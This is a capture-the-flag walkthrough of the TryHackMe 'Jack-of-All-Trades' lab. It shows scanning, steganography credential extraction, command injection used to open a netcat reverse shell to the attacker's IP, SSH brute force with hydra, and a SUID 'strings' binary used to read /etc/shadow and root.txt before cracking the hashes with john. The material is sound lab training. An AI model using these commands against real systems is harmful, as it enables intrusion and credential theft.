# Jack-of-All-Trades

**Room Link:** [https://tryhackme.com/room/jackofalltrades](https://tryhackme.com/room/jackofalltrades)



### Initial Scan

For some reason they switched port 22 with http site and 80 with ssh

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/22 - HTTP

```
gobuster dir -u http://$VICTIM:22 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

Had to all the override to see the site on port 22 in firefox



<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

There is a stegosaurus picture on the home page so it is hinting that there's something in one of the pictures, eventually we find jackinthebox username and password in one of the pictures.

**Kali**

```
steghide extract -sf stego.jpg 
Password: u?WtKSraq

steghide extract -sf header.jpg  
Password: u?WtKSraq
```

<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

If you run a command like this you can't see the results unless you view the source.

**Browser**

```
view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=whoami
```

<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
nc -lvnp 1337
```

**Browser**

```
view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=nc%20-c%20sh%2010.10.154.80%201337
```

<figure><img src="../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



In the home directory there is a password list, it's small enough so I copied and pasted into a file on Kali.

<figure><img src="../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -s 80 -l jack -P passwords.txt $VICTIM -t4 ssh
```

<figure><img src="../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh jack@$VICTIM -p 80
Password: ITMJpGGIqg1jn?>@
```

<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>



## PSPY

**Kali**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

<pre><code><strong>cd /tmp
</strong><strong>wget http://$KALI:81/pspy32 
</strong>chmod +x pspy32 
./pspy32 
</code></pre>



Strings as the  SUID-bit set which means we can run it against files we normally wouldn't be able to read. I tried getting roots password but it was taking too long.

**Victim**

```
find / -perm -u=s -type f 2> /dev/null 
/usr/bin/strings /etc/shadow
/usr/bin/strings /etc/passwd
```

**Kali**

```
unshadow passwd shadow > passwords.txt 
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

I just ended up using strings to read the root.txt

**Kali**

```
/usr/bin/strings /root/root.txt
```

<figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
